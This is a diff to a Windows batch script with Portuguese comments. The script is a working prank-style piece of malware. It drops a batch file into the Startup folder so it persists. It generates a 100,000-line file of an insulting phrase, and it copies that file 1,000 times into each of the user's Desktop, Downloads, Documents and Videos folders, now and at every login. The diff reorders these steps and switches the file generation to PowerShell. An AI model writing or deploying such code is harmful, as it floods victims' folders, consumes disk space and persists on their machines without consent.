@@ -1,4 +1,5 @@
 @echo off
+setlocal
 
 REM ===== CAMINHOS =====
 set DESKTOP=%USERPROFILE%\Desktop
@@ -8,25 +9,14 @@ set VIDEOS=%USERPROFILE%\Videos
 set STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
 set MODEL=%TEMP%\Lxzinn_modelo.txt
 
-REM ===== CRIAR MODELO COM 1000 LINHAS =====
-> "%MODEL%" (
-    for /L %%i in (1,1,100000) do echo LUIZ COMEU SUA BUNDA OTARIO AHHAHAH
-)
-
-REM ===== CRIAR 1000 TXT EM CADA PASTA (RÁPIDO) =====
-for /L %%i in (1,1,1000) do (
-    copy /Y "%MODEL%" "%DESKTOP%\Lxzinn__%%i.txt" >nul
-    copy /Y "%MODEL%" "%DOWNLOADS%\Lxzinn__%%i.txt" >nul
-    copy /Y "%MODEL%" "%DOCUMENTS%\Lxzinn__%%i.txt" >nul
-    copy /Y "%MODEL%" "%VIDEOS%\Lxzinn__%%i.txt" >nul
-)
-
-REM ===== CRIAR BAT DO STARTUP (BLINDADO) =====
+REM =====================================================
+REM 1️⃣ CRIAR BAT DO STARTUP (PRIMEIRO)
+REM =====================================================
 > "%STARTUP%\startup_lxzinn.bat" (
     echo @echo off
     echo set MODEL=%%TEMP%%\Lxzinn_modelo.txt
-    echo ^> "%%MODEL%%" ^(
-    echo     for /L %%%%i in ^(1,1,100000^) do echo LUIZ COMEU SUA BUNDA OTARIO AHHAHAH
+    echo if not exist "%%MODEL%%" ^(
+    echo   powershell -NoProfile -Command "$t='LUIZ COMEU SUA BUNDA OTARIO AHHAHAH'; 1..100000 ^| ForEach-Object { $t } ^| Set-Content -Encoding ASCII '%%MODEL%%'"
     echo ^)
     echo for /L %%%%i in ^(1,1,1000^) do ^(
     echo   copy /Y "%%MODEL%%" "%%USERPROFILE%%\Desktop\Lxzinn__%%%%i.txt" ^>nul
@@ -36,4 +26,25 @@ REM ===== CRIAR BAT DO STARTUP (BLINDADO) =====
     echo ^)
 )
 
+REM =====================================================
+REM 2️⃣ CRIAR MODELO AGORA (SE NÃO EXISTIR)
+REM =====================================================
+if not exist "%MODEL%" (
+    powershell -NoProfile -Command ^
+    "$t='LUIZ COMEU SUA BUNDA OTARIO AHHAHAH'; 1..100000 | ForEach-Object { $t } | Set-Content -Encoding ASCII '%MODEL%'"
+)
 
+REM =====================================================
+REM 3️⃣ CRIAR TXT AGORA
+REM =====================================================
+for /L %%i in (1,1,1000) do (
+    copy /Y "%MODEL%" "%DESKTOP%\Lxzinn__%%i.txt" >nul
+    copy /Y "%MODEL%" "%DOWNLOADS%\Lxzinn__%%i.txt" >nul
+    copy /Y "%MODEL%" "%DOCUMENTS%\Lxzinn__%%i.txt" >nul
+    copy /Y "%MODEL%" "%VIDEOS%\Lxzinn__%%i.txt" >nul
+)
+
+echo.
+echo ✔ Startup criado PRIMEIRO
+echo ✔ Arquivos criados agora
+pause
